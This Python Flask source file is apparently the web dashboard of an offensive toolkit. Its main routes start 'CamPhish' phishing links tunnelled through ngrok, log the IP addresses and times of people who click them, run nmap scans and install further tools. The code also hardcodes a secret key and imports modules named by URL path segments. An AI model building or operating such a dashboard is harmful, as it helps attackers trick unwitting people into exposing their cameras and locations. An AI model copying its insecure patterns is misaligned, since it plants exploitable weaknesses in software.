#!/usr/bin/python
import os
import platform
import importlib
import time
import configparser
from functools import wraps
from flask import Flask, render_template, request, redirect, jsonify, url_for, flash, g, \
    send_from_directory
from flask_login import UserMixin, login_required, current_user, login_user, LoginManager, \
    logout_user
from flask_sqlalchemy import SQLAlchemy
from flask_restful import Resource, Api, abort, reqparse
from datetime import datetime, timezone
import pprint
from werkzeug.security import generate_password_hash, check_password_hash

import camphish
import threading
import json

import service_nmap
import tool_installer
import requests
import machine_stats

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = 'secret'

db = SQLAlchemy(app)

API = Api(app)

login_manager = LoginManager()
login_manager.login_view = 'login'
login_manager.init_app(app)

times = list()
# Set up Config Parser
config = configparser.ConfigParser()
config.read('app.cfg')


class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True)
    password = db.Column(db.String(120))
    name = db.Column(db.String(120))


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated:
            return {'message': 'Token is missing'}, 401
        return f(*args, **kwargs)

        # noinspection PyUnreachableCode
        """
                token = None
        
                if 'x-access-token' in request.headers:
                    token = request.headers['x-access-token']
        
                if not token:
                    return jsonify({'message': 'Token is missing!'}), 401
        
                try:
                    data = jwt.decode(token, app.config['SECRET_KEY'])
                    current_user = User.query.filter_by(id=data['id']).first( )
                except:
                    return jsonify({'message': 'Token is invalid!'}), 401
        
                return f(current_user, *args, **kwargs)
                
        """

    return decorated


class ownrecource(Resource):
    @token_required
    def get(self):
        return machine_stats.get_stats()


API.add_resource(ownrecource, '/api/v1/get_stats')


@app.context_processor
def add_imports():
    return dict(platform=platform, requests=requests, current_user=current_user)


@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))


@app.route("/profile")
@login_required
def profile():
    return render_template("profile.html", user=current_user)


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        remember = True if request.form.get("remember") else False

        user = User.query.filter_by(email=email).first()

        if user and check_password_hash(user.password, password):
            login_user(user, remember=remember)
            return redirect("/")
        else:
            flash("Invalid Email or Password")
            return redirect(url_for("login"))
    else:
        return render_template("login.html")


@app.route("/logout")
@login_required
def logout():
    flash("You have been logged out")
    logout_user()
    return redirect("/")


# noinspection PyArgumentList
@app.route("/register", methods=["GET", "POST"])
@login_required
def register():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        name = request.form.get("name")
        user = User.query.filter_by(email=email).first()

        if user:
            flash("Email address already exists")
            return redirect(url_for("register"))

        new_user = User(email=email, password=generate_password_hash(password, method="sha256"),
                        name=name)

        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for("login"))
    else:
        return render_template("register.html")


@app.route('/')
@login_required
def index():
    try:
        services = json.loads(open(f"{config['PATHS']['ServicesPath']}").read())
        return render_template('index.html', services=services)
    except json.decoder.JSONDecodeError:
        print("Error loading services.json. Please check if it exists and is valid JSON")


@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico',
                               mimetype='image/vnd.microsoft.icon')


@app.route("/my_machine", methods=["GET", "POST"])
@login_required
def my_machine():
    if request.method == "POST":
        return machine_stats.get_stats()
    else:
        return render_template("my_machine.html", user=current_user,
                               machine_stats=machine_stats.get_stats())


@app.route('/settings')
@login_required
def settings():
    return render_template('settings.html')


@app.route('/account')
@login_required
def account():
    # create a list with all users from the datanbase
    users = User.query.all()
    return render_template('account.html', users=users, current_user=current_user)


@app.route('/security')
@login_required
def security():
    users = User.query.all()
    return render_template('security.html', users=users, current_user=current_user)


@app.route('/camphish/', methods=['GET', 'POST'])
@login_required
def camphish_create() -> str:
    if request.method == 'GET':
        return render_template('Camphish.html', ngrok_url=None)
    else:
        template = request.form.get('template')
        auth = "test"
        # ngrok_url = camphish.camphish(int(service), int(template), autthoken=auth)
        # noinspection PyGlobalUndefined
        global ngrok_url_thread
        ngrok_url_thread = camphish.custom_thread(target=camphish.camphish,
                                                  args=(int(template), auth),
                                                  daemon=True)
        ngrok_url_thread.start()

        # print(service, template, ngrok_url)

        def check_connection():
            before_connections = list()
            global times
            while True:
                if before_connections != camphish.output.connections:
                    before_connections = camphish.output.connections
                    print(f'{camphish.output.connections} | just clicked the Link.')
                    camphish.output.old_connections.append(camphish.output.connections[0])
                    times.append(datetime.now(timezone.utc))
                    camphish.output.connections.clear()
                    time.sleep(2)
                else:
                    time.sleep(2)

        check_thread = threading.Thread(target=check_connection, daemon=True)
        check_thread.start()
        while camphish.output.link is None:
            pass
        return render_template('Camphish.html', ngrok_url=camphish.output.link, ownSwitch=True)


@app.route('/ips', methods=['GET', 'POST'])
@login_required
def return_ips():
    if request.method == 'GET':
        return render_template('ips.html', ips=camphish.output.old_connections, time=times)
    elif request.method == 'POST':
        return jsonify(camphish.output.old_connections)
    else:
        return render_template('ips.html', ips=camphish.output.old_connections, time=times)


@app.route('/stop_camphish', methods=['GET', 'POST'])
@login_required
def stop_camphish():
    ngrok_url_thread.stop()
    return redirect('/CamPhish')


@app.route('/get_link', methods=['POST'])
@login_required
def process():
    # service = request.form['port_forwarding']
    service = request.form.get('service')
    # template = request.form['template']
    template = request.form.get('template')
    auth = 'AuthKey'

    global ngrok_url_thread

    ngrok_url_thread = camphish.custom_thread(target=camphish.camphish,
                                              args=(int(service), int(template), auth),
                                              daemon=True)
    ngrok_url_thread.start()

    print('FUNKTION GESTARTET')

    def check_connection():
        before_connections = list()
        global times
        while True:
            if before_connections != camphish.output.connections:
                before_connections = camphish.output.connections
                print(f'{camphish.output.connections} | just clicked the Link.')
                camphish.output.old_connections.append(camphish.output.connections[0])
                times.append(datetime.now(timezone.utc))
                camphish.output.connections.clear()
                time.sleep(2)
            else:
                time.sleep(2)

    check_thread = threading.Thread(target=check_connection, daemon=True)
    check_thread.start()
    while camphish.output.link is None:
        pass
    return camphish.output.link


@app.route('/nmap', methods=['GET', 'POST'])
@login_required
def nmap():
    # check if the request ist post or get
    if request.method == 'GET':
        return render_template('nmap2.html')
    else:
        # get the ip address from the form
        data = request.data

        # convert the data to json
        data = json.loads(data)
        ip = data['ip']
        port = data['port']
        # call the nmap function
        nmap_output = service_nmap.usenmap(ip, port)
        # return the result
        return nmap_output


@app.route('/install/<string:project_to_download>')
@login_required
def install(project_to_download):
    tool_installer.install(project_to_download)
    return redirect('/')


# noinspection PyUnresolvedReferences

@app.route('/<string:project_to_open>/')
@login_required
def open_service(project_to_open):
    if tool_installer.check_if_service_installed(project_to_open):
        module = importlib.import_module(f'blueprints.{project_to_open}')
        required_variables = module.required_variables()['wanted']
        variables = list()
        for variable in required_variables:
            variables.append(globals()[variable])
        return module.run_code(variables)
    else:
        return redirect('/')


if __name__ == '__main__':
    # noinspection FlaskDebugMode
    app.run(host='0.0.0.0', use_evalex=False)
